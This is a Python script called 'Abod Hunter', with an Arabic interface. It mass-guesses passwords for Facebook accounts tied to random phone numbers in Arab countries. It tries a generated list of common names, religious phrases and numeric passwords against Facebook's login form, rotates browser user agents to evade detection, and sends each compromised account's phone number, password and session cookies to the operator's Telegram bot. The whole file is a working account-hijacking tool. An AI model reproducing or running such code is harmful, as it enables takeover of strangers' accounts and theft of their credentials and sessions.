import os
import re
import random
import string
import sys
import requests
import time
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def abod_logo():
    print(r"""
      _____   _         _    
     |  __ \ | |       | |   
     | |  | || | ___   | | __
     | |  | || |/ _ \  | |/ /
     | |__| || | (_) | |   < 
     |_____/ |_|\___/  |_|\_\
                                 [~] A B O D H U N T E R [~]
""")
    print("\033[92m" + "="*40 + "\033[0m")
    print("\033[93m" + "           أداة صيد حسابات فيسبوك".center(30) + "\033[0m")
    print("\033[92m" + "="*40 + "\033[0m")
    print("\n")

ugen = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/91.0.4472.124 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
]
token = "" 
ID = ""          
countries = {
    "1": ("موريتانيا", "+222", "6", 7),
    "2": ("مصر", "+20", "1", 8),
    "3": ("المغرب", "+212", "6", 8),
    "4": ("الجزائر", "+213", "6", 8),
    "5": ("السعودية", "+966", "5", 8), 
    "6": ("العراق", "+964", "7", 9),
    "7": ("فلسطين", "+970", "5", 8),
    "8": ("اليمن", "+967", "7", 8),
    "9": ("الأردن", "+962", "7", 8),
    "10": ("سوريا", "+963", "9", 8),
    "11": ("لبنان", "+961", "7", 8),
    "12": ("تونس", "+216", "9", 8),
    "13": ("الإمارات", "+971", "5", 8),
    "14": ("الكويت", "+965", "6", 8),
    "15": ("قطر", "+974", "3", 8),
    "16": ("البحرين", "+973", "3", 8),
    "17": ("ليبيا", "+218", "9", 8),
    "18": ("السودان", "+249", "9", 8),
}

oks = []
cps = []
loop = 0

def generate_passwords():
    
    arabic_names = [
        "ahmed", "mohamed", "ali", "fatima", "zainab", "khaled", "omar", "saad", "nour",
        "yousef", "amin", "sara", "layla", "farah", "karim", "hassan", "hussein", "mustafa",
        "amira", "rana", "rania", "abdullah", "maged", "salem", "samir", "mahmoud", "mariam",
        "dina", "hend", "gamal", "basel", "nabil", "osama", "hisham", "aya", "asmaa", "nada",
        "salma", "ziad", "tarek", "kareem", "nourhan", "shaimaa", "raghad", "fares", "yassin",
        "lama", "malak", "jana", "layan", "faris", "yara", "habiba", "marwa", "sanaa", "amal",
        "hadia", "walaa", "gamil", "safaa", "iman", "reem", "haneen", "doaa", "shimaa", "walid",
        "sabah", "salah", "mazen", "joud", "majd", "rawan", "bader", "nawal", "noura", "hanan",
        "dana", "yasmin", "judy", "leen", "shahd", "faisal", "nasser", "sultan", "bandar", "majid",
        "mohammad", "ahmad", "fatma", "zainab"
    ]

    
    arabic_terms = [
        "bismillah", "inshallah", "alhamdulillah", "mashaallah", "subhanallah", "allahuakbar",
        "habibi", "habibti", "yaallah", "yaali", "allah", "islam", "muslim", "quran", "kaba", "rasul",
        "mohammed", "mohamed"
    ]

    
    numerical_patterns = [
        "123456", "1234567", "12345678", "123456789", "1234567890",
        "0987654321", "112233", "123123", "12341234", "12345",
        "000000", "654321", "111111", "222222", "333333", "778899",
        "11223344", "12345677", "1234566", "111222", "11112222",
        "334455", "1122334455", "1234567899", "000111", "000222",
        "102030", "332211", "202020", "00000000", "998877", "54321",
        "1111111", "2222222", "3333333", "4444444", "5555555",
        "6666666", "7777777", "8888888", "9999999", "0123456",
        "1000000", "2000000", "3000000", "4000000", "5000000",
        "6000000", "7000000", "8000000", "9000000", "12345678910",
        "13792468", "9876543210", "1234", "2345", "3456", "4567", "5678", "6789", "7890"
    ]

   
    simple_words = [
        "password", "qwertyuiop", "poiuytrewq", "zxcvbnm", "first123", "firstlast",
        "bestever", "mypassword", "love123", "name123", "password123", "5544332211",
        "qwerty", "azerty", "0147258369", "godmode", "hacker123",
        "admin123", "user123", "pass123", "iloveyou", "facebook", "anonymous", "matrix",
        "hacker", "dragon", "master", "darknet", "ninja", "ghost", "cyber", "freedom",
        "internet", "secure", "privacy", "king", "queen", "legend", "hero", "shadow", "iphone",
        "galaxy", "android", "samsung", "huawei", "laptop", "mobile", "smart"
    ]

    
    years = [str(y) for y in range(1980, 2025)]

    all_passwords = set()

   
    for item in numerical_patterns + simple_words + arabic_names + arabic_terms + years:
        all_passwords.add(item.lower()) 

    
    for name in arabic_names:
        name_lower = name.lower()
        
        
        all_passwords.add(name_lower + "123")
        all_passwords.add(name_lower + "1234")
        all_passwords.add(name_lower + "12345")
        all_passwords.add(name_lower + "1122")
        all_passwords.add(name_lower + "000")
        all_passwords.add(name_lower + "123456")
        all_passwords.add(name_lower + "789")
        all_passwords.add(name_lower + "01")
        all_passwords.add(name_lower + "11")
        all_passwords.add(name_lower + "321")
        all_passwords.add(name_lower + "@123")
        all_passwords.add(name_lower + "1@3")
        all_passwords.add(name_lower + "@")
        all_passwords.add(name_lower + "!")
        all_passwords.add(name_lower + "##")
        all_passwords.add(name_lower + "20") # لأعوام مثل 2000, 2010...

        
        for year in years[-20:]:
            all_passwords.add(name_lower + year)
            all_passwords.add(name_lower + "_" + year)
            all_passwords.add(name_lower + "." + year)
            all_passwords.add(name_lower + "-" + year)
        
        # اسم بحرف كبير + أرقام / سنوات
        name_cap = name_lower.capitalize()
        all_passwords.add(name_cap + "123")
        all_passwords.add(name_cap + "12345")
        all_passwords.add(name_cap + "2020")
        all_passwords.add(name_cap + "2021")
        all_passwords.add(name_cap + "000")
        all_passwords.add(name_cap + year)
    
    
    for i in range(100000, 1000000):
        all_passwords.add(str(i))
    for i in range(1000000, 10000000):
        all_passwords.add(str(i))

    return sorted(list(all_passwords))

passwords = generate_passwords()


# --- Main Function ---
def main():
    os.system("clear")
    abod_logo()

    global token, ID 
    print("\n\033[96m[!] يرجى إدخال بيانات التليجرام الخاصة بك للإشعارات.\033[0m")
    print("\033[90m[!] للحصول على توكن البوت: تحدث مع @BotFather على تيليجرام واضغط /newbot.\033[0m")
    print("\033[90m[!] للحصول على معرف الشات: تحدث مع @userinfobot على تيليجرام وانسخ الرقم بجانب 'ID'.\033[0m")
    token = input("\033[93m➤ أدخل توكن البوت الخاص بك: \033[0m").strip()
    ID = input("\033[93m➤ أدخل معرف الشات/الخاص بك: \033[0m").strip()
    print("\n" + "\033[92m" + "="*40 + "\033[0m" + "\n")

    print("اختر الدولة:\n")
    for k, v in countries.items():
        print(f"{k}. {v[0]} ({v[1]})")

    choice = input("\n➤ رقم الدولة: ").strip()
    if choice not in countries:
        print("\033[91m[!] خيار غير صحيح. يرجى البدء من جديد.\033[0m")
        time.sleep(2)
        sys.exit() 
        
    country_name, code, start_digit, num_suffix_length = countries[choice]
    print(f"\n[+] تم اختيار: {country_name}")
    print("\n[+] جاري توليد الأرقام وتخمين كلمات المرور...")
    print("      (اضغط \033[91mCtrl+C\033[0m في أي وقت للإيقاف)")
    print("\n" + "\033[92m" + "="*40 + "\033[0m" + "\n")
    
    with ThreadPool(max_workers=30) as pool: 
        try:
            while True: 
                num_suffix = ''.join(random.choices(string.digits, k=num_suffix_length))
                
         
                local_phone_number = start_digit + num_suffix 
                
                uid = code + local_phone_number 
                
                
                pwx = [local_phone_number, *passwords] 
                
                pool.submit(login, uid, pwx)
                
                global loop
                loop += 1
               
                sys.stdout.write(f"\r\033[96m[~] جاري الفحص: {loop} | صحيحة: {len(oks)} | مقفولة: {len(cps)}\033[0m")
                sys.stdout.flush()
                
        except KeyboardInterrupt:
          
            print("\n\033[93m[!] توقف الأداة بناءً على طلب المستخدم.\033[0m")
        finally:
            print("\n\033[92m[✓] انتهى الفحص.\033[0m")
            print(f"\033[92m[+] الحسابات الصحيحة: {len(oks)}\033[0m")
            print(f"\033[91m[+] الحسابات المقفولة (CP): {len(cps)}\033[0m")
            print("\033[92m" + "="*40 + "\033[0m")
            print("\n")


# --- Login Function ---
def login(uid, pwx):
    global oks, cps
    try:
        for pw in pwx:
            pro = random.choice(ugen)
            session = requests.Session()

            free_fb_response = session.get("https://free.facebook.com/login.php", headers={
                "User-Agent": pro
            }).text

            # استخراج القيم المطلوبة
            lsd = re.search('name="lsd" value="(.*?)"', free_fb_response)
            jazoest = re.search('name="jazoest" value="(.*?)"', free_fb_response)
            m_ts = re.search('name="m_ts" value="(.*?)"', free_fb_response)
            li = re.search('name="li" value="(.*?)"', free_fb_response)

            if not all([lsd, jazoest, m_ts, li]):
                continue

            log_data = {
                "lsd": lsd.group(1),
                "jazoest": jazoest.group(1),
                "m_ts": m_ts.group(1),
                "li": li.group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": pw,
                "login": "Log In"
            }

            headers = {
                "User-Agent": pro,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "https://free.facebook.com",
                "Referer": "https://free.facebook.com/login.php"
            }

            response = session.post("https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8",
                                    data=log_data, headers=headers, allow_redirects=True)
            cookies = session.cookies.get_dict()

            # تحقق من الدخول
            if "c_user" in cookies:
                cid = cookies.get("c_user")
                coki = ";".join([f"{k}={v}" for k, v in cookies.items()])
                profile_link = f"https://www.facebook.com/profile.php?id={cid}"

                print(f"\n\033[92m[✓] تم الدخول: {uid} | {pw}\033[0m")
                oks.append(uid)

                msg = f"""
✅ تم صيد حساب فيسبوك [Abod Hunter]

📱 الرقم : {uid}
🔑 كلمة المرور : {pw}
🔗 رابط الحساب : {profile_link}
🍪 الكوكيز : {coki}

بواسطة @N_QJS
"""
                if token and ID:
                    try:
                        requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}")
                    except:
                        pass
                break

            elif "checkpoint" in cookies:
                print(f"\n\033[91m[✖] حساب مقفل CP: {uid} | {pw}\033[0m")
                cps.append(uid)
                break

    except requests.exceptions.ConnectionError:
        pass
    except Exception as e:
        pass


# --- Entry Point ---
if __name__ == "__main__":
    main()